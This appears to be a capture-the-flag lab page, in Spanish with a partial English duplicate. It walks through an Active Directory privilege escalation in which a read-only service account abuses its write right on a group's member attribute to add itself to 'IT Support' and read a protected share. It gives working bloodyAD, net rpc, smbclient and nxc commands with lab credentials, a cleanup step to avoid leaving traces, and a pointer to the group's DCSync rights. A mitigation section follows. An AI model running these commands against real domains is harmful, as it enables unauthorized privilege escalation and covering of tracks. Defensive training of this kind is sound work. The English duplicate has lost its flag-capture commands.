Objetivo

svc.readonly puede escribir el atributo member del grupo «IT Support». Añádete tú mismo al grupo para heredar sus permisos y accede a //DC01/it_share.

Flag: //{{ ad_dc_host }}/it_share/flag-ad-09.txt — captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Añadir svc.readonly al grupo "IT Support"
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} \
  -u svc.readonly -p 'ReadOnly123!' \
  add groupMember 'IT Support' svc.readonly

1 · El derecho: WriteProperty sobre 'member'

Tener WriteProperty sobre el atributo member de un grupo (o el derecho extendido Self-Membership / AddSelf) permite modificar quién pertenece al grupo. Añadiéndote a ti mismo heredas todos los permisos del grupo de forma inmediata. BloodHound lo dibuja como AddSelf o WriteMember → Group.

2 · Añadirse al grupo

# bloodyAD
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  add groupMember 'IT Support' svc.readonly

# net rpc
net rpc group addmem 'IT Support' 'svc.readonly' \
  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}

# samba-tool desde una máquina unida (si aplica)
# samba-tool group addmembers "IT Support" svc.readonly

3 · Confirmar la pertenencia

nxc ldap no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa bloodyAD:

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object 'IT Support' --attr member

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object svc.readonly --attr memberOf

Importante: la pertenencia a grupos se materializa en un nuevo ticket Kerberos / nueva sesión. Vuelve a autenticarte para que el token incluya el grupo.

4 · Capturar la flag

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --shares
# El recurso it_share ahora aparece como accesible

smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt'
cat flag-ad-09.txt

5 · Limpieza

Quítate del grupo cuando termines para no dejar rastro persistente:

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  remove groupMember 'IT Support' svc.readonly

Ojo: este mismo grupo IT Support tiene derechos de replicación (DCSync) delegados — es el enlace directo con el lab AD 10.

Mitigación

  • Retirar los ACE de escritura sobre member concedidos a cuentas no administrativas.
  • Proteger los grupos privilegiados y auditar cambios de pertenencia (4728/4732/4756).
  • Aplicar tiering: una cuenta de solo lectura nunca debería poder editar grupos.

Herramientas

bloodyAD net rpc netexec (nxc) PowerView samba-tool

1 · The right: WriteProperty over 'member'

Holding WriteProperty on a group's member attribute (or the extended Self-Membership / AddSelf right) lets you change who belongs to the group. By adding yourself you immediately inherit all of the group's permissions. BloodHound draws it as AddSelf or WriteMember → Group.

2 · Add yourself to the group

# bloodyAD
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  add groupMember 'IT Support' svc.readonly

# net rpc
net rpc group addmem 'IT Support' 'svc.readonly' \
  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}

# samba-tool from a joined machine (if applicable)
# samba-tool group addmembers "IT Support" svc.readonly

3 · Confirm the membership

nxc ldap does not work against this DC (the NTLM bind fails, see AD 02) — use bloodyAD:

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object 'IT Support' --attr member

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  get object svc.readonly --attr memberOf

Important: group membership only lands in a fresh Kerberos ticket / new session. Re-authenticate so the token carries the group.

# The it_share share now shows up as accessible

5 · Cleanup

Remove yourself from the group when done so you leave no persistent trace:

bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
  remove groupMember 'IT Support' svc.readonly

Note: this very IT Support group has replication (DCSync) rights delegated — it is the direct bridge into lab AD 10.

Mitigation

  • Remove write ACEs over member granted to non-admin accounts.
  • Protect privileged groups and audit membership changes (4728/4732/4756).
  • Apply tiering: a read-only account should never be able to edit groups.
